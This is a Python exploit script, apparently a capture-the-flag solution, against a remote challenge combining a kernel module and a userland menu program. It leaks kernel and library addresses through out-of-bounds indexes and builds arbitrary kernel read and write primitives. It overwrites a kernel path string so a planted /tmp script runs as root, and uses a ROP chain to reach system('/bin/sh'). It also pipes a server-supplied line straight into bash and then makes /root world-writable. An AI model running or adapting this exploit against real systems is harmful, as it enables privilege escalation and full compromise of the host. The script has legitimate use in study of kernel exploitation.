import os
from ptrlib import *
import time

def add(index, size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(size))
def edit(index, size, data):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(size))
    sock.sendlineafter(": ", ' '.join(map(lambda x: f'{x:02x}', data)))
def show(index, size):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(size))
    sock.recvuntil("Data: ")
    output = b''
    for i in range(size):
        c = sock.recvonce(3)
        output += bytes.fromhex(c.decode().strip())
    return output
def check(index, size):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(size))
    sock.recvline()
    if b'Something went wrong' in sock.recvline():
        return False
    else:
        return True
def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", str(index))

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "9009")

elf = ELF("./interface")
libc = ELF("./libuClibc-1.0.40.so")
"""
sock = Process(["qemu-system-x86_64",
                "-m", "64M",
                "-nographic",
                "-kernel", "../distfiles/bzImage",
                "-append",
                "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr",
                "-no-reboot",
                "-cpu", "kvm64,+smap,+smep",
                "-monitor", "/dev/null",
                "-initrd", "../distfiles/rootfs.cpio"])
"""
sock = Socket(HOST, int(PORT))
p = Process(["bash", "-c", sock.recvline().decode()])
sock.sendline(p.recvlineafter("hashcash token: "))
p.close()

sock.recvuntil(" seconds\n")
logger.info("Boot done")

"""
Step 1. Kernel Exploit
"""
# leak kbase
kbase = u64(show(-24, 0x50)[0x48:]) - 0xeabbc0
logger.info("kbase = " + hex(kbase))

# leak mbase
mbase = u64(show(-5, 0x50)[:8]) - 0x23d0
logger.info("mbase = " + hex(mbase))

def AAR(address, size, f=show):
    for i in range(8):
        edit(-5, 1, bytes([0xf0 + i]))
        edit(-6, 1, bytes([(address >> (i*8)) & 0xff]))
    return f(-2, size)

def AAW(address, data):
    for i in range(8):
        edit(-5, 1, bytes([0xf0 + i]))
        edit(-6, 1, bytes([(address >> (i*8)) & 0xff]))
    edit(-2, len(data), data)

AAW(kbase + 0x1038480 - 0x200000, b"/tmp/feneko\0")

"""
Step 2. Leak user-land stack address
"""
# kernel
addr_heap = u64(AAR(mbase + 0x2208, 8))
logger.info("kheap = " + hex(addr_heap))
addr_stack = u64(AAR(addr_heap + 0x88, 8))
logger.info("kstack = " + hex(addr_stack))

# user
delta = 0xffffc90000147eb0 - 0xffffc90000078000
proc_base = u64(AAR(addr_stack + delta + 0xc0, 8)) - elf.symbol("_start")
elf.set_base(proc_base)
libc_base = u64(AAR(elf.got("printf"), 8)) - libc.symbol("printf")
libc.set_base(libc_base)
delta = 0x7ffe8f9a5a78 - 0x7ffe8f9a5998
addr_stack = u64(AAR(libc.symbol("environ"), 8)) - delta
logger.info("ustack = " + hex(addr_stack)) # ret addr

"""
Step 3. Get shell
"""
rop_ret = libc_base + 0x00019e65
rop_pop_rdi = libc_base + 0x00019e64
AAW(addr_stack + 0x00, p64(rop_pop_rdi).rstrip(b'\x00'))
AAW(addr_stack + 0x08, p64(next(libc.find("/bin/sh"))))
AAW(addr_stack + 0x10, p64(libc.symbol("system")))
sock.sendlineafter("> ", "5")

sock.sendlineafter("$ ", "cd /tmp")
sock.sendlineafter("$ ", "echo '#!/bin/sh\nchmod 777 /root -R' > feneko")
sock.sendlineafter("$ ", "chmod +x /tmp/feneko")
sock.sendlineafter("$ ", "echo -ne '\\xff\\xff\\xff\\xff' > tsunoda")
sock.sendlineafter("$ ", "chmod +x tsunoda")
sock.sendlineafter("$ ", "/tmp/tsunoda")

sock.interactive()
